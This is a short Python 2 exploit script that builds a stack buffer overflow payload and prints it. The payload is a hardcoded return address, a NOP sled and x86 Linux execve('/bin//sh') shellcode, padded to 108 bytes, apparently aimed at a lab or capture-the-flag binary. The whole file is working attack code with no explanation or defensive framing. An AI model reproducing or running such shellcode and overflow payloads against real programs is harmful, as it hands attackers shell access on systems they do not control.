#!/usr/bin/python
import struct

def p(x):
	return struct.pack("<I", x)

def exploit():	
	BUFFER = 0xffffd3bc

	# Overwrite at 104
	payload =  p(BUFFER+0x4)
	payload += "\x90"*40 
	payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" 
	payload += "A"*(108-len(payload))
	payload += p(BUFFER+0x4)

	print payload
	
exploit()
    
